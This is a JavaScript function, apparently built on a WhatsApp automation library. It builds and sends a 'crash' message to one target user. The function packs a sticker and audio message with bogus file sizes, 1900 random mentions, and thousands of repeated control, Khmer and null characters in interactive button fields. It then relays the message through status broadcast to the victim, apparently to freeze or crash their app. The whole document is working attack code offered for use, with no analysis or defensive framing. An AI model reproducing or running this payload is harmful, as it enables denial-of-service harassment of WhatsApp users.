async function SyarDellay(sock, target) {
  try {
    const stickerMsg = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/webp",
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "1173741824",
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            isAnimated: false,
            viewOnce: false,
          },
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileLength: "99999999",
            seconds: 9999,
            ptt: true,
            streamingSidecar: "AAAA",
            mediaKeyTimestamp: "1743848703",
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 1900 }, () =>
                  "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
                )
              ],
              forwardingScore: 9999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: "🎵"
              }
            }
          },
          contextInfo: {
            ephemeralExpiration: 0,
            forwardingScore: 999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
              "#" +
              Math.floor(Math.random() * 0xffffff)
                .toString(16)
                .padStart(6, "0"),
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { text: "MakLo", format: "DEFAULT" },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "single_select",
                          buttonParamsJson: "\x10".repeat(5000)
                        },
                        {
                          name: "call_permission_request",
                          buttonParamsJson: "ោ៝".repeat(13000)
                        },
                        {
                          name: "carousel_message",
                          buttonParamsJson:
                            "\x10".repeat(5000) + "ោ៝".repeat(6000)
                        }
                      ],
                      messageParamsJson: "ោ៝".repeat(1000),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    };

    const stickerMsgLite = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/webp",
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "1173741824",
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            isAnimated: false,
            viewOnce: false,
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 1900 }, () =>
                  "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                )
              ],
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9999,
              isForwarded: true,
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: { text: "MakLo", format: "DEFAULT" },
                      nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(99999),
                        version: 3
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    };

    const msg = generateWAMessageFromContent(target, stickerMsg, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error(err);
  }
}